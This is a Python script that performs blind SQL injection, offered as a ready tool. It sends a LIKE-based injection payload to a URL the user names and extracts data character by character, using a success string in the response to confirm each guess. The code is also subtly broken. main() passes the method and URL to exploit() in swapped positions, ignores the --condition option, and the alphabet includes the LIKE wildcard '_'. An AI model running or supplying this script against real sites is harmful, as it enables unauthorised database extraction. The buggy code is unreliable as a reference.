import argparse
import binascii
import logging
import random
import string

import requests

# Possible alphabets for extraction
alphabet_full = string.ascii_letters + string.digits + "{}_."
alphabet_lowercase = string.ascii_lowercase + string.digits + "{}_."
alphabet_hex = string.digits + "abcdef"

# Initialize the HTTP session
s = requests.Session()

def setup_logging(level=logging.INFO):
    """Configure logging with the specified level."""
    logging.basicConfig(
        format='%(asctime)s - %(levelname)s - %(message)s',
        level=level,
        datefmt='%Y-%m-%d %H:%M:%S'
    )

def string_generator(length):
    """Generate a random string of the specified length."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def check_condition(response_text,condition):
    """Verify the success condition based on the server response."""
    return condition in response_text

def send_payload(payload: dict, url: str, post: bool):
    """Send a payload to the base URL and return the response."""
    try:
        if post:
            response = s.post(url, data=payload)
        else:
            response = s.get(url, params=payload)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        logging.error(f"Error in request: {e}")
        return ""

def is_hex(string: str) -> bool:
    if len(string) % 2 != 0:
        return False
    if not all(char in alphabet_hex for char in string):
        return False
    return True

def exploit(payload_template: dict,  condition:str, url: str, method:str, is_hex: bool = False):
    """Perform the blind SQL injection attack and log the progress."""
    extracted_string = ""

    alphabet = alphabet_hex if is_hex else alphabet_full

    while True:
        found_char = None

        for char in alphabet:
            test_string = extracted_string + char
            payload = {k: v.replace("{test_string}", test_string, 1) if "{test_string}" in v else v for k, v in payload_template.items()}

            logging.debug(f"Testing payload: {payload}")
            response = send_payload(payload,url,method == "post")

            if check_condition(response,condition):
                logging.info(f"Found character: {char}")
                extracted_string += char
                found_char = char
                break

        if not found_char:
            if is_hex:
                logging.info(f"Extraction completed: {binascii.unhexlify(extracted_string)}")
            else:
                logging.info(f"Extraction completed: {extracted_string}")
            break

def main():
    parser = argparse.ArgumentParser(description="Blind SQL Injection Exploit")
    parser.add_argument("--log", choices=["debug", "info", "warning", "error", "critical"], default="info", help="Set logging level")
    parser.add_argument("--hex", action="store_true", help="Interpret extracted string as hex")
    parser.add_argument("--url", required=True, help="Base URL for the SQL injection")
    parser.add_argument("--condition", required=False, help="Condition string to identify successful extraction")
    parser.add_argument("--method", choices=["get", "post"], default="post", help="HTTP method to use for requests")
    args = parser.parse_args()

    log_level = getattr(logging, args.log.upper())
    setup_logging(log_level)

    payloads = [
        {"query": "' OR username LIKE '{test_string}%' -- "}
    ]

    for payload in payloads:
        exploit(payload, "success", args.method, args.url, is_hex=args.hex)

if __name__ == "__main__":
    main()
